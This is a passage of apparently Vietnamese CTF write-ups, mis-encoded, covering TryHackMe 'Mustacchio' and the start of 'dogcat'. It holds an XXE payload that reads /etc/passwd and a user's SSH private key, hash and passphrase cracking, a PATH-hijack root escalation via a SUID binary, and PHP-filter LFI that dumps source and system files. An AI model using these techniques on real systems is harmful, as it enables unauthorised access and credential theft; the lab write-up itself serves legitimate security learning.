58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P | 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0= | 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Mustacchio | Home 8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST |_http-title: Mustacchio | Login |_http-server-header: nginx/1.10.3 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Vá»›i port 80 tÃ´i cÃ³ 1 web html vÃ  port 8765 lÃ  1 trang Ä‘Äƒng nháº­p. Thá»­ khai thÃ¡c web vá»›i port 80 trÆ°á»›c.\nDÃ¹ng dirsearch Ä‘á»ƒ tÃ¬m web path\n[04:54:45] 200 - 3KB - /about.html [04:55:25] 200 - 1KB - /contact.html [04:55:27] 200 - 1KB - /custom/ [04:55:38] 301 - 312B - /fonts -\u0026gt; http://10.10.28.153/fonts/ [04:55:40] 200 - 2KB - /gallery.html [04:55:44] 200 - 6KB - /images/ [04:55:44] 301 - 313B - /images -\u0026gt; http://10.10.28.153/images/ [04:55:46] 200 - 2KB - /index.html [04:56:21] 200 - 28B - /robots.txt [04:56:24] 403 - 277B - /server-status/ [04:56:24] 403 - 277B - /server-status VÃ o thÆ° má»¥c /custom/ tÃ´i cÃ³ 2 file lÃ  moblie.js vÃ  users.bak. TÃ´i táº¡m thá»i chÆ°a quan tÃ¢m Ä‘áº¿n file js vÃ  táº£i file bak vá» trÆ°á»›c.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat users.bak ï¿½ï¿½0]admin1868e36a6d2b17d4c2745f1659433a54d4****** Sau admin cÃ³ thá»ƒ lÃ  password, nhÃ¬n sÆ¡ qua Ä‘oáº¡n mÃ£ nÃ y giá»‘ng md5. Decode nÃ³ vÃ  tÃ´i cÃ³ password cá»§a admin. Thá»­ login vÃ o port 8765\nSá»­ dá»¥ng BurpSuite Ä‘á»ƒ phÃ¢n tÃ­ch request xem cÃ³ gÃ¬ thÃº vá»‹ khÃ´ng\nSource web cÃ³ 1 Ä‘oáº¡n script á»Ÿ Ä‘Ã¢y vÃ  1 dÃ²ng áº©n:\n\u0026lt;!-- Barry, you can now SSH in using your key!--\u0026gt;\nVá»›i Ä‘oáº¡n script, tÃ´i cÃ³ thÃªm 1 path má»›i: /auth/dontfoget.bak. DÃ¹ng web táº£i file nÃ y vá»\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat dontforget.bak \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;Joe Hamd\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Barry Clad\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ CÃ³ váº» nhÆ° Ä‘Ã¢y chÃ­nh lÃ  form cá»§a comment á»Ÿ web. Thá»­ sao chÃ©p Ä‘oáº¡n nÃ y vÃ o comment vÃ  server tráº£ vá» Ä‘Ãºng nhÆ° form\nSau 1 lÃºc tÃ¬m kiáº¿m cÃ¡ch khai thÃ¡c lá»—i sá»­ dá»¥ng XXE, tÃ´i tÃ¬m Ä‘Æ°á»£c payload á»Ÿ Ä‘Ã¢y. Sá»­a Ä‘oáº¡n xml máº«u 1 chÃºt, tÃ´i sáº½ láº¥y file tá»« server vÃ  thay comment lÃ  1 cÃ¢u lá»‡nh Ä‘á»ƒ server Ä‘á»c vÃ  in ná»™i dung file ra cho tÃ´i.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [\u0026lt;!ENTITY read SYSTEM \u0026#39;file:///etc/passwd\u0026#39;\u0026gt;]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;Joe Hamd\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Barry Clad\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;\u0026amp;read;\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; CÃ³ váº» lÃ  hÆ¡i khÃ³ Ä‘á»c, tÃ´i sáº½ quay láº¡i Burp\nÄá»ƒ thá»±c thi Ä‘Æ°á»£c lá»‡nh, tÃ´i pháº£i chuyá»ƒn nÃ³ vá» dáº¡ng url. Sau 1 lÃºc báº¿ táº¯c thÃ¬ tÃ´i nháº­n ra cÃ²n 1 hint ná»¯a mÃ  tÃ´i chÆ°a dÃ¹ng Ä‘áº¿n, lÃ  ssh key cá»§a Barry. ThÃ´ng thÆ°á»ng ssh key sáº½ náº±m trong thÆ° má»¥c .ssh trong thÆ° má»¥c user, váº­y thÃ¬ Ä‘Æ°á»ng dáº«n file cÃ³ thá»ƒ sáº½ giá»‘ng nhÆ° tháº¿ nÃ y:\n/home/barry/.ssh/id_rsa\nThay path nÃ y vÃ o /etc/passwd vÃ  encode nÃ³ thÃ nh url\nSSH # Sao chÃ©p ssh key vá» vÃ  login ssh vá»›i key nÃ y. Tuy nhiÃªn khi login tÃ´i cáº§n passphrase. Sá»­ dá»¥ng john Ä‘á»ƒ brute-force passphrase\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh2john id_rsa \u0026gt; hash â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Login vÃ o SSH vá»›i port 22\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh -i id_rsa barry@10.10.82.130 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 34 packages can be updated. 16 of these updates are security updates. To see these additional updates run: apt list --upgradable The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. barry@mustacchio:~$ id uid=1003(barry) gid=1003(barry) groups=1003(barry) barry@mustacchio:~$ ls user.txt barry@mustacchio:~$ Privilege escalation # TÃ´i thá»­ tÃ¬m SUID\nfind / -type f -perm -u=s 2\u0026gt;/dev/null\nbarry@mustacchio:~$ find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/passwd /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/at /usr/bin/chsh /usr/bin/newgidmap /usr/bin/sudo /usr/bin/newuidmap /usr/bin/gpasswd /home/joe/live_log /bin/ping /bin/ping6 /bin/umount /bin/mount /bin/fusermount /bin/su TÃ´i Ä‘á»ƒ Ã½ cÃ³ 1 file Ä‘áº·c biá»‡t lÃ  /home/joe/live_log, khi xem qua nÃ³ thÃ¬ Ä‘Ã¢y lÃ  1 file binary. DÃ¹ng strings Ä‘á»ƒ phÃ¢n tÃ­ch ná»™i dung\nbarry@mustacchio:/home/joe$ strings live_log /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid printf system __cxa_finalize setgid __libc_start_main GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u+UH []A\\A]A^A_ Live Nginx Log Reader tail -f /var/log/nginx/access.log :*3$\u0026#34; GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.8060 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry demo.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable _edata system@@GLIBC_2.2.5 printf@@GLIBC_2.2.5 __libc_start_main@@GLIBC_2.2.5 __data_start __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main setgid@@GLIBC_2.2.5 __TMC_END__ _ITM_registerTMCloneTable setuid@@GLIBC_2.2.5 __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment Khi cháº¡y file nÃ y, nÃ³ sáº½ gá»i Ä‘áº¿n file access.log vÃ  in log ra theo thá»i gian thá»±c, vÃ  vÃ¬ file binary nÃ y cháº¡y vá»›i quyá»n root nÃªn tÃ´i cÃ³ thá»ƒ leo thang Ä‘áº·c quyá»n vá»›i file nÃ y mÃ  khÃ´ng cáº§n sudo.\nTÃ´i sáº½ sá»­ dá»¥ng ká»¹ thuáº­t giá»‘ng nhÆ° Ä‘Ã£ trÃ¬nh bÃ y á»Ÿ CTF Tryhackme - Wonderland, Ä‘áº¿n thÆ° má»¥c /tmp vÃ¬ nÃ³ cÃ³ toÃ n quyá»n ghi vÃ  thá»±c thi file. Sau Ä‘Ã³ táº¡o 1 file tail chá»©a lá»‡nh thá»±c thi, set quyá»n thá»±c thi cho nÃ³, thÃªm path /tmp vÃ o Ä‘áº§u biáº¿n PATH Ä‘á»ƒ khi cháº¡y file live_log trong Ä‘Ã¢y, nÃ³ sáº½ gá»i ngay Ä‘áº¿n tail vá»«a táº¡o.\nNÃ³ sáº½ nhÆ° tháº¿ nÃ y\nbarry@mustacchio:/tmp$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; tail barry@mustacchio:/tmp$ chmod 777 tail barry@mustacchio:/tmp$ export PATH=/tmp:$PATH barry@mustacchio:/tmp$ /home/joe/live_log root@mustacchio:/tmp# id uid=0(root) gid=0(root) groups=0(root),1003(barry) root@mustacchio:/tmp# ls /root root.txt root@mustacchio:/tmp# HoÃ n thÃ nh!\n","date":"31 December 2021","externalUrl":null,"permalink":"/ctf/tryhackme/mustacchio/","section":"Ctf","summary":"","title":"Tryhackme - Mustacchio","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - dogcat\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m quÃ©t cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H | 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s= | 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Ngay tá»« Ä‘áº§u khi Ä‘á»c tiÃªu Ä‘á» tÃ´i tÆ°á»Ÿng Ä‘Ã¢y lÃ  web server thÃ¬ Ã­t nháº¥t sáº½ cÃ³ port 80, nhÆ°ng chá»‰ cÃ³ port 22 - SSH Ä‘ang má»Ÿ máº·c dÃ¹ tÃ´i Ä‘Ã£ thá»­ quÃ©t láº¡i vÃ i láº§n. Sau vÃ i phÃºt thÃ¬ tÃ´i thá»­ thÃªm IP vÃ o file host Ä‘á»ƒ xem nÃ³ cÃ³ ra Ä‘Æ°á»£c port 80 hay khÃ´ng. VÃ  Ä‘Ãºng lÃ  nÃ³ ra tháº­t \u0026#x1f612;\nKhi click vÃ o \u0026ldquo;A dog\u0026rdquo; hay \u0026ldquo;A cat\u0026rdquo; thÃ¬ nÃ³ sáº½ hiá»‡n random 1 bá»©c áº£nh vá» chÃ³ mÃ¨o vÃ  url sáº½ hiá»‡n filter ?view=...\nVá»›i filter nÃ y cá»™ng thÃªm tiÃªu Ä‘á» cá»§a machine nÃ y thÃ¬ tÃ´i nghÄ© cÃ³ thá»ƒ dÃ¹ng LFI - PHP filter Ä‘á»ƒ khai thÃ¡c. TÃ´i sáº½ dÃ¹ng BurpSuite Ä‘á»ƒ phÃ¢n tÃ­ch request\nÄiá»u nÃ y cÃ³ nghÄ©a lÃ  trong request pháº£i cÃ³ \u0026ldquo;dog\u0026rdquo; hoáº·c \u0026ldquo;cat\u0026rdquo;. Tá»« Ä‘Ã¢y tÃ´i cÃ³ 1 vÃ i suy Ä‘oÃ¡n, trong web server cÃ³ 2 thÆ° má»¥c lÃ  \u0026ldquo;dog\u0026rdquo; vÃ  \u0026ldquo;cat\u0026rdquo; chá»©a cÃ¡c bá»©c áº£nh, khi chá»n dog hoáº·c cat tá»« client, server sáº½ trá» vÃ o thÆ° má»¥c vÃ  chá»n 1 trong cÃ¡c bá»©c áº£nh chÃ³(mÃ¨o).\nVÃ  vÃ¬ \u0026ldquo;dog\u0026rdquo; hay \u0026ldquo;cat\u0026rdquo; lÃ  thÆ° má»¥c nÃªn tÃ´i sáº½ Ä‘á»ƒ nÃ³ ngay sau base64 encoder.\nGiáº£i mÃ£ Ä‘oáº¡n base64 nÃ y vÃ  tÃ´i cÃ³ source cá»§a trang index.php\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ echo \u0026#34;PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==\u0026#34; | base64 -d \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;dogcat\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;dogcat\u0026lt;/h1\u0026gt; \u0026lt;i\u0026gt;a gallery of various dogs or cats\u0026lt;/i\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;What would you like to see?\u0026lt;/h2\u0026gt; \u0026lt;a href=\u0026#34;/?view=dog\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;dog\u0026#34;\u0026gt;A dog\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/?view=cat\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;cat\u0026#34;\u0026gt;A cat\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026#34;ext\u0026#34;]) ? $_GET[\u0026#34;ext\u0026#34;] : \u0026#39;.php\u0026#39;; if(isset($_GET[\u0026#39;view\u0026#39;])) { if(containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;dog\u0026#39;) || containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;cat\u0026#39;)) { echo \u0026#39;Here you go!\u0026#39;; include $_GET[\u0026#39;view\u0026#39;] . $ext; } else { echo \u0026#39;Sorry, only dogs or cats are allowed.\u0026#39;; } } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Vá»›i trang index.php nÃ y, sau khi láº¥y áº£nh tá»« thÆ° má»¥c, server sáº½ thÃªm biáº¿n \u0026ldquo;ext\u0026rdquo; vÃ o cuá»‘i. TÃ´i sáº½ thá»­ má»Ÿ nhá»¯ng file khÃ´ng pháº£i php vÃ  thÃªm \u0026ldquo;ext\u0026rdquo; vÃ o sau nhÆ° tháº¿ nÃ y\nGiáº£i mÃ£ nÃ³ vÃ  tÃ´i cÃ³ ná»™i dung file passwd\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ echo \u0026#34;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=\u0026#34; | base64 -d root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Trong khi tÃ¬m cÃ¡ch táº¡o RCE tá»« LFI thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c vÃ i cÃ¡ch khÃ¡c Ä‘á»ƒ khai thÃ¡c thÃ´ng tin, Ä‘Ã³ lÃ  khai thÃ¡c thÃ´ng tin tá»« access.log. Thá»­ kiá»ƒm tra qua Ä‘Æ°á»ng dáº«n apache hoáº·c apache2 xem cÃ³ thu Ä‘Æ°á»£c káº¿t quáº£ nÃ o khÃ´ng.\n127.0.0.1 - - [22/Aug/2022:08:09:03 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:09:39 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:10:21 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:10:59 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:11:39 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:12:18 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:12:53 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:13:29 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:14:04 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:14:40 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:15:15 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:15:51 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:16:26 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:17:02 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:17:37 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:18:13 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:18:48 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - [22/Aug/2022:08:19:24 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 615 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.0\u0026#34; 127.0.0.1 - - 